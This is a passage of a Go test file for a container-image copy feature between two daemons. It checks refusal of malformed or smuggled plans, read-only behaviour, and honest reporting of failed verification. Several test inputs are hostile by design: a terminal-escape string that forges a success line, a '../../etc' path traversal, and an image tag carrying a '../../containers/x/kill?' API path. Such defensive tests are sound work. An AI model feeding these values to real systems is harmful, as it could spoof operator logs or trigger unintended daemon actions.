			return engine.ImageFacts{}, &engine.Error{Kind: engine.KindUnavailable, Msg: "connection refused"}
		}, "could not be read after the load (connection refused): the load may have completed, and nothing is claimed"},
	} {
		t.Run(name, func(t *testing.T) {
			c := newImgCopyRig(t, copyRefName, nil)
			p := c.plan(copyRefName)
			c.dstEng = &lyingTarget{Engine: c.dst.eng, after: tc.after}
			j := c.run(p)
			log := logText(j)
			if j.State != jobs.Failed || !strings.Contains(j.Err, tc.want) {
				t.Fatalf("job %v %q\n%s", j.State, j.Err, log)
			}
			if strings.Contains(log, "✓") || strings.Contains(log, "verified on the target") {
				t.Fatalf("a failed verification claimed success:\n%s", log)
			}
		})
	}
}

// TestExecuteCopyEscapesTheTarget: whatever the target daemon says during a
// load is drawn as text, never as terminal control or a forged line.
func TestExecuteCopyEscapesTheTarget(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	p := c.plan(copyRefName)
	c.dstEng = &lyingTarget{Engine: c.dst.eng, text: "\x1b[2J\x1b]0;owned\x07✓ copy image done\nverified\r"}
	j := c.run(p)
	if j.State != jobs.Succeeded {
		t.Fatalf("job %+v\n%s", j, logText(j))
	}
	noControl(t, j)
	if !strings.Contains(logText(j), `target: \x1b[2J`) {
		t.Fatalf("the target's line is missing:\n%s", logText(j))
	}
}

func TestExecuteCopyReadOnly(t *testing.T) {
	for name, wrap := range map[string]func(c *imgCopyRig){
		"target": func(c *imgCopyRig) { c.dstEng = engine.ReadOnly(c.dst.eng) },
		"source": func(c *imgCopyRig) { c.srcEng = engine.ReadOnly(c.src.eng) },
	} {
		c := newImgCopyRig(t, copyRefName, nil)
		p := c.plan(copyRefName)
		wrap(c)
		j := c.run(p)
		if j.State != jobs.Failed || !strings.Contains(j.Err, "read-only") {
			t.Fatalf("%s: %v %q", name, j.State, j.Err)
		}
		if len(c.src.srv.Requests()) != 0 || len(c.dst.srv.Requests()) != 0 {
			t.Fatalf("%s: read-only sent %v / %v", name, c.src.srv.Requests(), c.dst.srv.Requests())
		}
	}
}

// ---- Execute refuses a copy, and a malformed copy is refused (2.3) -------------------

func TestExecuteRefusesACopyPlan(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	p := c.plan(copyRefName)
	if !p.Runnable() {
		t.Fatal("the plan should be runnable")
	}
	for name, eng := range map[string]*rig{"the source": c.src, "the target": c.dst} {
		id := c.jm.Start("x", "y", func(ctx context.Context, run *jobs.Run) error { return Execute(ctx, eng.eng, p, run) })
		c.jm.Wait()
		j, _ := c.jm.Get(id)
		if j.State != jobs.Failed || !strings.Contains(j.Err, "two daemons") || !strings.Contains(j.Err, "ExecuteCopy") || !strings.Contains(j.Err, "nothing was sent") {
			t.Fatalf("%s: %v %q", name, j.State, j.Err)
		}
	}
	if len(c.src.srv.Requests()) != 0 || len(c.dst.srv.Requests()) != 0 {
		t.Fatalf("Execute sent requests: %v / %v", c.src.srv.Requests(), c.dst.srv.Requests())
	}
	// A copy step smuggled into another plan is refused too, and such a
	// plan is not runnable in the first place.
	smuggled := Plan{Steps: []Step{{Op: OpRemoveImage, ID: "x"}, p.Steps[0]}}
	if smuggled.Runnable() {
		t.Fatal("a plan with a stray copy step is runnable")
	}
	id := c.jm.Start("x", "y", func(ctx context.Context, run *jobs.Run) error { return Execute(ctx, c.src.eng, smuggled, run) })
	c.jm.Wait()
	if j, _ := c.jm.Get(id); j.State != jobs.Failed || !strings.Contains(j.Err, "two daemons") || len(c.src.srv.Requests()) != 0 {
		t.Fatalf("smuggled: %+v", j)
	}
}

func TestExecuteCopyRefusesAMalformedPlan(t *testing.T) {
	c := newImgCopyRig(t, copyRefName, nil)
	good := c.plan(copyRefName)
	spec := func(p *Plan) *ImageCopySpec {
		cp := *p.ImageCopy
		p.ImageCopy = &cp
		return &cp
	}
	for name, mut := range map[string]func(p *Plan){
		"no spec":            func(p *Plan) { p.ImageCopy = nil },
		"blocked":            func(p *Plan) { p.Blockers = []string{"no"} },
		"two steps":          func(p *Plan) { p.Steps = append(p.Steps, p.Steps[0]) },
		"another op":         func(p *Plan) { p.Steps = []Step{{Op: OpRemoveImage, ID: copyRefName}} },
		"odd image id":       func(p *Plan) { spec(p).ImageID = "acme/api:latest" },
		"pin differs":        func(p *Plan) { p.Steps = []Step{p.Steps[0]}; p.Steps[0].Pin = hexID('f') },
		"odd target owner":   func(p *Plan) { spec(p).TargetOwner = "../../etc" },
		"the same daemon":    func(p *Plan) { spec(p).Target.Key = p.ImageCopy.Source.Key },
		"step names another": func(p *Plan) { p.Steps = []Step{p.Steps[0]}; p.Steps[0].ID = "other:1" },
		"tag not normalised": func(p *Plan) {
			s := spec(p)
			s.Ref = "acme/api"
			p.Steps = []Step{p.Steps[0]}
			p.Steps[0].ID = "acme/api"
		},
		"path in the tag": func(p *Plan) {
			s := spec(p)
			s.Ref = "../../containers/x/kill?"
			p.Steps = []Step{p.Steps[0]}
			p.Steps[0].ID = s.Ref
		},
	} {
		p := good
		p.Steps = append([]Step(nil), good.Steps...)
		mut(&p)
		j := c.run2(p)
		if j.State != jobs.Failed || !strings.Contains(j.Err, "internal error") || !strings.Contains(j.Err, "nothing was sent") {
			t.Errorf("%s: %v %q", name, j.State, j.Err)
		}
	}
	if len(c.src.srv.Requests()) != 0 || len(c.dst.srv.Requests()) != 0 {
		t.Fatalf("a malformed plan sent requests: %v / %v", c.src.srv.Requests(), c.dst.srv.Requests())
	}
	// The same engine twice is not two daemons.
	c.dstEng = c.srcEng
	if j := c.run2(good); j.State != jobs.Failed || !strings.Contains(j.Err, "two different daemons") || len(c.src.srv.Requests()) != 0 {
		t.Fatalf("one engine: %+v", j)
	}
}

// run2 runs a plan that may have no specification to take daemon keys from.
func (c *imgCopyRig) run2(p Plan) jobs.Job {
	c.t.Helper()
	id := c.jm.Start(p.JobTitle, p.JobTarget, func(ctx context.Context, run *jobs.Run) error {
		return ExecuteCopy(ctx, c.srcEng, c.dstEng, p, run)
	})
	c.jm.Wait()
	j, _ := c.jm.Get(id)
	return j
}
